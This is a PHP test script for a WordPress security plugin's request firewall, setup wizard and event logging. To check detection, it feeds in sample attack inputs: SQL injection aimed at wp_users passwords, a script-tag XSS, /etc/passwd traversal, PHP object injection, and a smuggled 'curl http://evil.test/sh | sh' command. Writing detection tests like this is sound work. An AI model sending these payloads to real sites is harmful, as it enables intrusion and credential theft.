<?php declare(strict_types=1);

PHP_SAPI === 'cli' || exit(1);

$tmp_root    = sys_get_temp_dir() . '/gratis_sec_rg_' . bin2hex(random_bytes(4));
$tmp_web     = $tmp_root . '/web';
$tmp_wp      = $tmp_web . '/wp';
$tmp_uploads = $tmp_web . '/app/uploads';
$tmp_storage = $tmp_uploads . '/gratis-security';

@mkdir($tmp_wp . '/wp-includes', 0755, true); // phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged,WordPress.WP.AlternativeFunctions.file_system_operations_mkdir -- Standalone CLI test fixture/stub.
@mkdir($tmp_uploads, 0755, true); // phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged,WordPress.WP.AlternativeFunctions.file_system_operations_mkdir -- Standalone CLI test fixture/stub.
@mkdir($tmp_web . '/app/plugins/demo-plugin', 0755, true); // phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged,WordPress.WP.AlternativeFunctions.file_system_operations_mkdir -- Standalone CLI test fixture/stub.

define('ABSPATH', $tmp_wp . '/');
define('WP_CONTENT_DIR', $tmp_web . '/app');

if (!function_exists('wp_upload_dir')) {
    function wp_upload_dir(): array {
        return ['basedir' => WP_CONTENT_DIR . '/uploads'];
    }
}
if (!function_exists('wp_mkdir_p')) {
    function wp_mkdir_p(string $target): bool {
        return is_dir($target) || @mkdir($target, 0755, true); // phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged,WordPress.WP.AlternativeFunctions.file_system_operations_mkdir -- Standalone CLI test fixture/stub.
    }
}
if (!function_exists('get_option')) {
    function get_option(string $option, mixed $default_value = false): mixed {
        return $GLOBALS['gratis_test_options'][$option] ?? $default_value;
    }
}
if (!function_exists('update_option')) {
    function update_option(string $option, mixed $value): bool {
        $GLOBALS['gratis_test_options'][$option] = $value;
        return true;
    }
}
if (!function_exists('delete_option')) {
    function delete_option(string $option): bool {
        unset($GLOBALS['gratis_test_options'][$option]);
        return true;
    }
}
if (!function_exists('wp_next_scheduled')) {
    function wp_next_scheduled(string $hook): int|false {
        return $GLOBALS['gratis_test_crons'][$hook] ?? false;
    }
}
if (!function_exists('wp_schedule_event')) {
    function wp_schedule_event(int $timestamp, string $recurrence, string $hook): bool {
        $GLOBALS['gratis_test_crons'][$hook] = $timestamp;
        return true;
    }
}
if (!function_exists('__')) {
    function __(string $text, string $domain = 'default'): string { // phpcs:ignore Generic.CodeAnalysis.UnusedFunctionParameter.FoundAfterLastUsed -- Standalone CLI test fixture/stub.
        return $text;
    }
}

$GLOBALS['gratis_test_options'] = [];
$GLOBALS['gratis_test_crons']   = [];

require_once dirname(__DIR__) . '/autoload.php';

use Gratis\Security\EventMonitor;
use Gratis\Security\MalwareScanner;
use Gratis\Security\RequestGuard;
use Gratis\Security\SetupWizard;
use Gratis\Security\SignatureFeed;
use Gratis\Security\WAF;

function rm_rf(string $dir): void {
    if (!is_dir($dir)) {
        return;
    }
    $items = scandir($dir);
    if (!is_array($items)) {
        return;
    }
    foreach ($items as $item) {
        if ('.' === $item || '..' === $item) {
            continue;
        }
        $path = $dir . '/' . $item;
        if (is_dir($path) && !is_link($path)) {
            rm_rf($path);
        } else {
            @unlink($path); // phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged,WordPress.WP.AlternativeFunctions.unlink_unlink -- Standalone CLI test fixture/stub.
        }
    }
    @rmdir($dir); // phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged,WordPress.WP.AlternativeFunctions.file_system_operations_rmdir -- Standalone CLI test fixture/stub.
}

try {
    @mkdir($tmp_storage, 0755, true); // phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged,WordPress.WP.AlternativeFunctions.file_system_operations_mkdir -- Standalone CLI test fixture/stub.

    // 1. RequestGuard::ip_matches_cidr()
    assert(RequestGuard::ip_matches_cidr('192.168.1.42', '192.168.1.42') === true);
    assert(RequestGuard::ip_matches_cidr('192.168.1.42', '192.168.1.43') === false);
    assert(RequestGuard::ip_matches_cidr('192.168.1.42', '192.168.1.0/24') === true);
    assert(RequestGuard::ip_matches_cidr('192.168.2.42', '192.168.1.0/24') === false);
    assert(RequestGuard::ip_matches_cidr('10.0.0.199', '10.0.0.128/25') === true);
    assert(RequestGuard::ip_matches_cidr('10.0.0.50', '10.0.0.128/25') === false);
    assert(RequestGuard::ip_matches_cidr('2001:0db8:0000:0000:0000:0000:0000:0001', '2001:db8::1') === true);
    assert(RequestGuard::ip_matches_cidr('2001:db8:abcd::5', '2001:db8::/32') === true);
    assert(RequestGuard::ip_matches_cidr('2001:db9::5', '2001:db8::/32') === false);
    assert(RequestGuard::ip_matches_cidr('192.168.1.1', '2001:db8::/32') === false);
    assert(RequestGuard::ip_matches_cidr('not-an-ip', '192.168.1.0/24') === false);
    assert(RequestGuard::ip_matches_cidr('192.168.1.1', '192.168.1.0/99') === false);

    // 2. RequestGuard::get_mode() backwards compatibility
    assert(RequestGuard::get_mode() === 'monitor');
    $GLOBALS['gratis_test_options']['gratis_security_settings'] = ['waf_enabled' => 1];
    assert(RequestGuard::get_mode() === 'block');
    $GLOBALS['gratis_test_options']['gratis_security_settings'] = ['waf_mode' => 'off', 'waf_enabled' => 1];
    assert(RequestGuard::get_mode() === 'off');
    $GLOBALS['gratis_test_options']['gratis_security_settings'] = ['waf_mode' => 'monitor'];
    assert(RequestGuard::get_mode() === 'monitor');

    // 3. RequestGuard::evaluate_request() across attack categories & bypasses
    $clean_req = [
        'ip'                      => '198.51.100.10',
        'method'                  => 'GET',
        'uri'                     => '/keliai/vilnius-kaunas/',
        'query'                   => 'lang=lt',
        'body'                    => '',
        'user_agent'              => 'Mozilla/5.0',
        'referer'                 => 'https://vialietuva.lt/',
        'is_authenticated_editor' => false,
    ];
    assert(RequestGuard::evaluate_request($clean_req, $tmp_storage) === null);

    // SQLi
    $sqli = RequestGuard::evaluate_request(array_merge($clean_req, [
        'query' => 'id=1%20UNION%20ALL%20SELECT%20user_pass%20FROM%20wp_users',
    ]), $tmp_storage);
    assert($sqli !== null && $sqli['category'] === 'sqli');

    // XSS
    $xss = RequestGuard::evaluate_request(array_merge($clean_req, [
        'body' => 'comment=<script>alert(1)</script>',
    ]), $tmp_storage);
    assert($xss !== null && $xss['category'] === 'xss');

    // LFI
    $lfi = RequestGuard::evaluate_request(array_merge($clean_req, [
        'query' => 'file=../../etc/passwd',
    ]), $tmp_storage);
    assert($lfi !== null && $lfi['category'] === 'lfi' && $lfi['severity'] === 'critical');

    // RCE
    $rce = RequestGuard::evaluate_request(array_merge($clean_req, [
        'body' => 'cmd=; curl http://evil.test/sh | sh',
    ]), $tmp_storage);
    assert($rce !== null && $rce['category'] === 'rce' && $rce['severity'] === 'critical');

    // PHP Object Injection
    $php_obj = RequestGuard::evaluate_request(array_merge($clean_req, [
        'body' => 'payload=O:8:"stdClass":1:{s:1:"a";s:2:"hi";}',
    ]), $tmp_storage);
    assert($php_obj !== null && $php_obj['category'] === 'php_object');

    // Scanner UA
    $scanner = RequestGuard::evaluate_request(array_merge($clean_req, [
        'user_agent' => 'sqlmap/1.7.11#stable',
    ]), $tmp_storage);
    assert($scanner !== null && $scanner['category'] === 'scanner');

    // Sensitive probe
    $probe = RequestGuard::evaluate_request(array_merge($clean_req, [
        'uri' => '/.env',
    ]), $tmp_storage);
    assert($probe !== null && $probe['category'] === 'probe');

    // XML-RPC
    $xmlrpc = RequestGuard::evaluate_request(array_merge($clean_req, [
        'uri' => '/xmlrpc.php',
    ]), $tmp_storage, ['block_xmlrpc' => true]);
    assert($xmlrpc !== null && $xmlrpc['category'] === 'xmlrpc' && $xmlrpc['rule'] === 'xmlrpc_blocked');

    // Authenticated editor bypass
    $editor_bypass = RequestGuard::evaluate_request(array_merge($clean_req, [
        'body'                    => '<script>console.log(1)</script>',
        'is_authenticated_editor' => true,
    ]), $tmp_storage);
    assert($editor_bypass === null);

    // Manual CIDR blocklist
    $add_block = RequestGuard::add_ip_rule('203.0.113.0/24', 'blocklist', 'Spam subnet', $tmp_storage);
    assert($add_block['success'] === true);
    $blocked_cidr = RequestGuard::evaluate_request(array_merge($clean_req, [
        'ip' => '203.0.113.77',
    ]), $tmp_storage);
    assert($blocked_cidr !== null && $blocked_cidr['category'] === 'ip_blocklist' && $blocked_cidr['force_block'] === true);

    // Allowlist bypass overrides both blocklist and attack payloads
    $add_allow = RequestGuard::add_ip_rule('203.0.113.77', 'allowlist', 'Trusted QA node', $tmp_storage);
    assert($add_allow['success'] === true);
    $allowed = RequestGuard::evaluate_request(array_merge($clean_req, [
        'ip'    => '203.0.113.77',
        'query' => 'q=UNION+SELECT+1',
    ]), $tmp_storage);
    assert($allowed === null);
    assert(RequestGuard::remove_ip_rule('203.0.113.77', 'allowlist', $tmp_storage) === true);
    assert(RequestGuard::remove_ip_rule('203.0.113.0/24', 'blocklist', $tmp_storage) === true);

    // Strikes, auto-ban, active ban check, unban
    assert(RequestGuard::record_strike('198.51.100.55', 900, $tmp_storage) === 1);
    assert(RequestGuard::record_strike('198.51.100.55', 900, $tmp_storage) === 2);
    $ban = RequestGuard::ban_ip('198.51.100.55', 30, 'Repeated SQLi attempts', $tmp_storage);
    assert($ban['ip'] === '198.51.100.55' && $ban['until'] > time());
    $active_bans = RequestGuard::get_active_bans($tmp_storage);
    assert(isset($active_bans['198.51.100.55']));

    $ban_eval = RequestGuard::evaluate_request(array_merge($clean_req, [
        'ip' => '198.51.100.55',
    ]), $tmp_storage);
    assert($ban_eval !== null && $ban_eval['rule'] === 'auto_ban' && $ban_eval['force_block'] === true);

    // 4. record_event(), query_requests(), filtering, pagination, top_ips, WAF facade
    $now = time();
    RequestGuard::record_event([
        'ip'              => '198.51.100.55',
        'method'          => 'GET',
        'uri'             => '/?id=1+UNION+SELECT+1',
        'category'        => 'sqli',
        'rule'            => 'rq_sqli_union',
        'label'           => 'SQL UNION SELECT probe',
        'severity'        => 'critical',
        'action'          => 'blocked',
        'matched_snippet' => 'UNION SELECT',
        'timestamp'       => $now - 100,
        'time'            => gmdate('c', $now - 100),
    ], $tmp_storage);
    RequestGuard::record_event([
        'ip'              => '198.51.100.55',
        'method'          => 'GET',
        'uri'             => '/.env',
        'category'        => 'probe',
        'rule'            => 'rq_probe_secrets',
        'label'           => 'Sensitive .env probe',
        'severity'        => 'high',
        'action'          => 'blocked',
        'matched_snippet' => '/.env',
        'timestamp'       => $now - 80,
        'time'            => gmdate('c', $now - 80),
    ], $tmp_storage);
    RequestGuard::record_event([
        'ip'              => '192.0.2.99',
        'method'          => 'POST',
        'uri'             => '/wp-login.php',
        'category'        => 'bruteforce',
        'rule'            => 'login_failed',
        'label'           => 'Failed login attempt',
        'severity'        => 'medium',
        'action'          => 'logged',
        'matched_snippet' => 'Attempt 1/5',
        'timestamp'       => $now - 60,
        'time'            => gmdate('c', $now - 60),
    ], $tmp_storage);
    RequestGuard::record_event([
        'ip'              => '192.0.2.100',
        'method'          => 'GET',
        'uri'             => '/?q=<script>alert(1)</script>',
        'category'        => 'xss',
        'rule'            => 'rq_xss_script_tag',
        'label'           => 'Script tag XSS',
        'severity'        => 'high',
        'action'          => 'logged',
        'matched_snippet' => '<script>',
        'timestamp'       => $now - 20,
        'time'            => gmdate('c', $now - 20),
    ], $tmp_storage);

    $q_p1 = RequestGuard::query_requests(['page' => 1, 'per_page' => 2], $tmp_storage);
    assert($q_p1['counts']['total'] === 4);
    assert($q_p1['counts']['blocked'] === 2);
    assert($q_p1['counts']['logged'] === 2);
    assert($q_p1['counts']['critical'] === 1);
    assert($q_p1['counts']['high'] === 2);
    assert($q_p1['counts']['medium'] === 1);
    assert($q_p1['counts']['active_bans'] === 1);
    assert($q_p1['total_filtered'] === 4);
    assert($q_p1['total_pages'] === 2);
    assert(count($q_p1['requests']) === 2);
    assert($q_p1['top_ips'][0]['ip'] === '198.51.100.55');
    assert($q_p1['top_ips'][0]['count'] === 2);
    assert($q_p1['top_ips'][0]['blocked'] === true);

    $q_p2 = RequestGuard::query_requests(['page' => 2, 'per_page' => 2], $tmp_storage);
    assert(count($q_p2['requests']) === 2);
    assert($q_p2['requests'][0]['id'] !== $q_p1['requests'][0]['id']);

    assert(RequestGuard::query_requests(['category' => 'sqli'], $tmp_storage)['total_filtered'] === 1);
    assert(RequestGuard::query_requests(['severity' => 'high'], $tmp_storage)['total_filtered'] === 2);
    assert(RequestGuard::query_requests(['action' => 'blocked'], $tmp_storage)['total_filtered'] === 2);
    assert(RequestGuard::query_requests(['ip' => '192.0.2.99'], $tmp_storage)['total_filtered'] === 1);
    assert(RequestGuard::query_requests(['search' => 'UNION'], $tmp_storage)['total_filtered'] === 1);

    assert(RequestGuard::unban_ip('198.51.100.55', $tmp_storage) === true);
    assert(empty(RequestGuard::get_active_bans($tmp_storage)));

    // WAF backwards-compat facade
    $blocks = WAF::get_blocks(10);
    assert(count($blocks) === 4);
    assert(isset($blocks[0]['reason'], $blocks[0]['ip'], $blocks[0]['uri'], $blocks[0]['time']));
    WAF::clear_blocks();
    assert(RequestGuard::query_requests([], $tmp_storage)['counts']['total'] === 0);

    // 5. SetupWizard::run_auto_configure() & diagnose()
    $clean_php = $tmp_web . '/app/plugins/demo-plugin/clean.php';
    file_put_contents($clean_php, "<?php\nreturn 'ok';\n"); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_file_put_contents -- Standalone CLI test fixture/stub.
    file_put_contents($tmp_root . '/SOURCE-MANIFEST.sha256', hash_file('sha256', $clean_php) . "  web/app/plugins/demo-plugin/clean.php\n"); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_file_put_contents -- Standalone CLI test fixture/stub.

    // Seed a false-positive detection matching manifest so run_auto_configure() purges it
    file_put_contents( // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_file_put_contents -- Standalone CLI test fixture/stub.
        $tmp_storage . '/' . EventMonitor::DETECTIONS_FILE,
        json_encode([ // phpcs:ignore WordPress.WP.AlternativeFunctions.json_encode_json_encode -- Standalone CLI test fixture/stub.
            'id'        => 'det_seed_fp',
            'rule'      => 'code_modified_runtime',
            'severity'  => 'medium',
            'path'      => 'web/app/plugins/demo-plugin/clean.php',
            'raw_path'  => $clean_php,
            'event'     => 'CLOSE_WRITE,CLOSE',
            'component' => 'plugins',
            'status'    => 'open',
        ]) . "\n"
    );

    $wizard_res = SetupWizard::run_auto_configure([
        'waf_mode'          => 'monitor',
        'sync_wp_checksums' => false,
        'run_scans'         => true,
    ], $tmp_root, $tmp_storage);

    assert($wizard_res['ok'] === true);
    assert(!empty($wizard_res['completed_at']));
    assert($wizard_res['steps']['storage']['ok'] === true);
    assert($wizard_res['steps']['settings']['ok'] === true);
    assert($wizard_res['steps']['signatures']['ok'] === true);
    assert($wizard_res['steps']['cron']['ok'] === true);
    assert($wizard_res['steps']['cleanup']['removed'] === 1);
    assert($wizard_res['steps']['cleanup']['remaining'] === 0);
    assert($wizard_res['steps']['malware_scan']['ok'] === true);
    assert(file_exists($tmp_storage . '/.htaccess'));
    assert(file_exists($tmp_storage . '/index.php'));
    assert(file_exists($tmp_storage . '/' . EventMonitor::EVENTS_FILE));
    assert(file_exists($tmp_storage . '/' . SignatureFeed::SIGNATURES_FILE));
    assert(file_exists($tmp_storage . '/' . MalwareScanner::REPORT_FILE));
    assert(is_int($wizard_res['audit']['score']) && $wizard_res['audit']['score'] >= 50);

    $diag = SetupWizard::diagnose('php', $tmp_root, $tmp_storage);
    assert(!empty($diag['wizard_completed_at']));
    assert(isset($diag['php_capabilities']['extensions']['json']));
    assert(is_array($diag['auto_actions_summary']) && !empty($diag['auto_actions_summary']));
    assert(is_array($diag['optional_os_upgrades']) && !empty($diag['optional_os_upgrades']));

    echo "All RequestGuard & SetupWizard assertions passed!\n";
} finally {
    rm_rf($tmp_root);
}
